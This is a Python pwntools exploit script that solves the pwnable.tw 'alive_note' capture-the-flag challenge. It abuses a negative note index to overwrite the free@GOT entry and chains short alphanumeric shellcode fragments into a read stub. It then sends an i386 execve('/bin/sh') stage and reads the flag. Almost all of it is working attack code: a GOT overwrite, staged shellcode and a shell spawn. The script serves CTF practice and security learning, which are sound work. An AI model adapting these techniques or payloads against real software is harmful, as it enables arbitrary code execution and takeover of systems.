#!/usr/bin/env python3
from pwn import *

PORT = 10300
HOST = "chall.pwnable.tw"
elf = context.binary = ELF('./alive_note', checksec=False)
# libc = ELF('./libc.so.6', checksec=False)
# ld = ELF('./ld-linux-x86-64.so.2', checksec=False)

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
            set resolve-heap-via-heuristic force
            b* 0x0804884a
            b* 0x080488ea
            c
            set follow-fork-mode parent
            ''')

def conn():
    if args.REMOTE:
        return remote(HOST, PORT)
    else:
        return elf.process()

p = conn()

def sla(pr, dt):
    p.sendlineafter(pr, dt)

def sa(pr, dt):
    p.sendafter(pr, dt)

def menu(idx):
    sla(b'Your choice :', str(idx).encode())

def add(idx, name):
    menu(1)
    sla(b'Index :', str(idx).encode())
    
    if len(name) == 8:
        sa(b'Name :', name)
    else:
        sla(b'Name :', name)

def show(idx):
    menu(2)
    sla(b'Index :', str(idx).encode())

def delete(idx):
    menu(3)
    sla(b'Index :', str(idx).encode())

def padding():
    for _ in range(3):
        add(9, b"d1nhdwc")

"""
sc1 = '''		
	push eax  
    pop ecx    # ecx = eax = note[2] = sc4
    push 0x7a
    pop edx	   # edx stage2 = 0x7a
    jnz +0x39  # -> sc2
	'''

sc2 = '''
	push 0x30
    pop eax
    xor al, 0x30
    dec eax    # al = 0xff
    jnz +0x38  # -> sc3
	'''

sc3 = '''
	xor byte ptr [ecx+0x45], al
    inc ecx
    dec ecx
    jnz +0x39  # -> sc4
	'''

sc4 = '''
	xor al, 0x33
    xor byte ptr [ecx+0x46], al
    jnz +0x39  # -> sc5
	'''

sc5 = '''
	push 0x33
    pop eax
    xor al, 0x30
    .byte 0x32
    dec esp  # read(3, ecx, 0x7a)
	'''
"""

sc1 = b"PYjzZu9"
sc2 = b"j0X40Hu8"
sc3 = b"0AEAIu9"
sc4 = b"430AFu9"
sc5 = b"j3X402L"

add(-27, sc1) # free@got index
padding()
add(0, sc2)

padding()
add(1, sc3)

padding()
add(2, sc4)

padding()
GDB()
add(3, sc5)

padding()
delete(2)

sc = asm('''
    xor eax, eax
    xor ebx, ebx
    xor ecx, ecx
    xor edx, edx

    mov al, 0xb

    push ebx
    push 0x68732f2f
    push 0x6e69622f
    mov ebx, esp

    int 0x80
''', arch='i386')

stage2 = b'\x90' * 0x48 + sc
p.send(stage2)

p.sendline(b'cat home/alive_note/flag')
p.interactive()

# d1nhdwc
# refer: https://ret2p4nda.github.io/2017/12/06/pwnable-tw-alivenote/